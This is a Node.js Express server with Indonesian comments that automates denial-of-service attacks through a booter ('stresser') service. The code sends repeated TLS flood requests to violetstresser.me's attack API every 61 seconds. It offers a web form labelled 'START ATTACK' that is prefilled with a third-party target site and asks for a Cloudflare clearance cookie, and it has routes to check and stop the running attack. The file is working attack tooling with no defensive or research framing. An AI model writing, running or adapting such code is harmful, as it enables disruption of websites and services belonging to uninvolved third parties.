const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware untuk baca JSON Body
app.use(express.json());
app.use(express.urlencoded({ extended: true })); // Penting untuk Form HTML

// Konfigurasi
const VIOLET_API = "https://violetstresser.me/api/attack";
const USER = "vh7788";
let activeSession = null;

// Fungsi Kirim Request
async function hitViolet(target, cookie) {
    try {
        const res = await axios.post(VIOLET_API, {
            username: USER,
            host: target,
            port: "443",
            time: 60,
            method: "TLS",
            concurrents: 1
        }, {
            headers: {
                "Host": "violetstresser.me",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Cookie": cookie,
                "Origin": "https://violetstresser.me",
                "Referer": "https://violetstresser.me/hub"
            },
            timeout: 10000
        });
        return res.data;
    } catch (e) {
        return { success: false, error: e.message };
    }
}

// Loop Otomatis
function startLoop(target, cookie) {
    if (activeSession) activeSession.active = false; // Stop sesi lama
    
    activeSession = { target, cookie, active: true, count: 0, lastRes: null };
    
    console.log(`[START] Looping for ${target}`);
    const loop = async () => {
        if (!activeSession || !activeSession.active) return;

        activeSession.count++;
        console.log(`[LOOP #${activeSession.count}] Hitting...`);
        
        const result = await hitViolet(target, cookie);
        activeSession.lastRes = result;

        if (!result.success) {
            console.log("[STOP] Failed:", result.error);
            activeSession.active = false;
        } else {
            setTimeout(loop, 61000); // Ulangi setelah 61 detik
        }
    };

    loop(); // Jalankan pertama kali
}

// --- ROUTES ---

// 1. Halaman Utama (Form Input)
app.get('/', (req, res) => {
    res.send(`
        <html><body style="background:#111; color:#fff; font-family:sans-serif; padding:20px;">
        <h1>🚀 Violet Stresser API</h1>
        <form action="/start" method="POST">
            <p>Target:</p>
            <input type="text" name="target" value="https://kartutoto.com/" style="width:100%; padding:10px; margin-bottom:10px;">
            <p>Cookie (cf_clearance):</p>
            <textarea name="cookie" placeholder="Paste full cf_clearance=..." style="width:100%; height:100px; padding:10px; margin-bottom:10px;"></textarea>
            <br>
            <button type="submit" style="padding:15px 30px; background:green; color:white; border:none; cursor:pointer;">START ATTACK</button>
        </form>
        <hr>
        <a href="/status" style="color:cyan;">Status</a> | <a href="/stop" style="color:red;">Stop</a>
        </body></html>
    `);
});

// 2. Start Attack (Terima dari Form POST)
app.post('/start', (req, res) => {
    const { target, cookie } = req.body;
    if (!target || !cookie) return res.send("❌ Missing Target or Cookie");
    
    startLoop(target.startsWith('http') ? target : 'https://' + target, cookie);
    res.send("<h1>✅ Attack Started!</h1><p>Check <a href='/status'>Status</a></p>");
});
// 3. Status
app.get('/status', (req, res) => {
    if (!activeSession) return res.send("ℹ️ No active session.");
    res.json(activeSession);
});

// 4. Stop
app.get('/stop', (req, res) => {
    if (activeSession) activeSession.active = false;
    res.send("🛑 Stopped.");
});

// Jalankan Server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
